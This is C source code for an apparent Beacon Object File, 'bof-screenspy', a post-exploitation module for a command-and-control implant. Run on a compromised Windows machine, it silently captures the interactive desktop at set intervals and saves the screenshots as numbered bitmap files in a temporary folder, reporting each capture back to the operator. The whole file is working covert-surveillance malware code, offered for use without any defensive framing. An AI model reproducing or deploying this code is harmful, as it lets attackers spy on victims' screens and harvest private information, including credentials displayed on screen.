/*
 * bof-screenspy [outdir] [interval-seconds] [count]
 *
 * Capture the interactive desktop repeatedly and save numbered 32-bit BMPs.
 * Defaults: %TEMP%\bof_screenspy, 5 second interval, 5 shots.
 *
 * The command blocks the calling agent thread for interval*count seconds.
 * Captures the current session's desktop; locked or disconnected sessions
 * return a black image.
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static int capture_bmp(const char *path)
{
    int w, h;
    HDC screen = NULL, mem = NULL;
    HBITMAP bmp = NULL;
    BITMAPINFO bi;
    BITMAPFILEHEADER fh;
    BITMAPINFOHEADER ih;
    DWORD imgsize;
    BYTE *pixels = NULL;
    HANDLE f;
    DWORD written = 0;
    int ok = 0;

    w = USER32$GetSystemMetrics(0);
    h = USER32$GetSystemMetrics(1);
    if (w <= 0 || h <= 0) return 0;

    screen = USER32$GetDC(NULL);
    if (!screen) return 0;
    mem = GDI32$CreateCompatibleDC(screen);
    bmp = GDI32$CreateCompatibleBitmap(screen, w, h);
    if (!mem || !bmp) goto cleanup;

    GDI32$SelectObject(mem, bmp);
    if (!GDI32$BitBlt(mem, 0, 0, w, h, screen, 0, 0, SRCCOPY)) goto cleanup;

    imgsize = (DWORD)w * (DWORD)h * 4;
    pixels = (BYTE *)KERNEL32$VirtualAlloc(NULL, imgsize, MEM_COMMIT | MEM_RESERVE,
                                           PAGE_READWRITE);
    if (!pixels) goto cleanup;

    bof_memzero(&bi, sizeof(bi));
    bi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bi.bmiHeader.biWidth = w;
    bi.bmiHeader.biHeight = -h;
    bi.bmiHeader.biPlanes = 1;
    bi.bmiHeader.biBitCount = 32;
    bi.bmiHeader.biCompression = BI_RGB;

    if (!GDI32$GetDIBits(mem, bmp, 0, (UINT)h, pixels, &bi, DIB_RGB_COLORS))
        goto cleanup;

    bof_memzero(&fh, sizeof(fh));
    fh.bfType = 0x4D42;
    fh.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
    fh.bfSize = fh.bfOffBits + imgsize;

    bof_memcpy(&ih, &bi.bmiHeader, sizeof(ih));
    ih.biSizeImage = imgsize;

    f = KERNEL32$CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
    if (f != INVALID_HANDLE_VALUE) {
        KERNEL32$WriteFile(f, &fh, sizeof(fh), &written, NULL);
        KERNEL32$WriteFile(f, &ih, sizeof(ih), &written, NULL);
        KERNEL32$WriteFile(f, pixels, imgsize, &written, NULL);
        KERNEL32$CloseHandle(f);
        ok = 1;
    }

cleanup:
    if (pixels) KERNEL32$VirtualFree(pixels, 0, MEM_RELEASE);
    if (bmp) GDI32$DeleteObject(bmp);
    if (mem) GDI32$DeleteDC(mem);
    if (screen) USER32$ReleaseDC(NULL, screen);
    return ok;
}

void go(char *args, int alen)
{
    datap parser;
    char *dir = "";
    int dlen = 0, interval = 5, count = 5, i;
    char outdir[MAX_PATH];

    BeaconDataParse(&parser, args, alen);
    dir = BeaconDataExtract(&parser, &dlen);
    {
        int v = BeaconDataInt(&parser);
        if (v > 0 && v <= 3600) interval = v;
    }
    {
        int v = BeaconDataInt(&parser);
        if (v > 0 && v <= 500) count = v;
    }
    if (!dir) dir = "";

    if (dir[0]) {
        bof_strncpy(outdir, dir, sizeof(outdir));
    } else {
        KERNEL32$GetTempPathA(sizeof(outdir), outdir);
        bof_strncat(outdir, "bof_screenspy", sizeof(outdir) - bof_strlen(outdir) - 1);
    }
    if (KERNEL32$GetFileAttributesA(outdir) == INVALID_FILE_ATTRIBUTES)
        KERNEL32$CreateDirectoryA(outdir, NULL);

    BeaconPrintf(CALLBACK_OUTPUT,
                 "[*] capturing %d shot(s), %d s apart -> %s\n",
                 count, interval, outdir);

    for (i = 0; i < count; i++) {
        char file[MAX_PATH + 32], num[8];
        bof_itoa((unsigned long long)i, num);
        bof_strncpy(file, outdir, sizeof(file));
        bof_strncat(file, "\\shot_", sizeof(file) - bof_strlen(file) - 1);
        if (i < 10) bof_strncat(file, "00", sizeof(file) - bof_strlen(file) - 1);
        else if (i < 100) bof_strncat(file, "0", sizeof(file) - bof_strlen(file) - 1);
        bof_strncat(file, num, sizeof(file) - bof_strlen(file) - 1);
        bof_strncat(file, ".bmp", sizeof(file) - bof_strlen(file) - 1);

        if (capture_bmp(file))
            BeaconPrintf(CALLBACK_OUTPUT, "[+] %s\n", file);
        else
            BeaconPrintf(CALLBACK_ERROR, "[-] capture failed (%d)\n", i);

        if (i + 1 < count) KERNEL32$Sleep((DWORD)interval * 1000);
    }
}
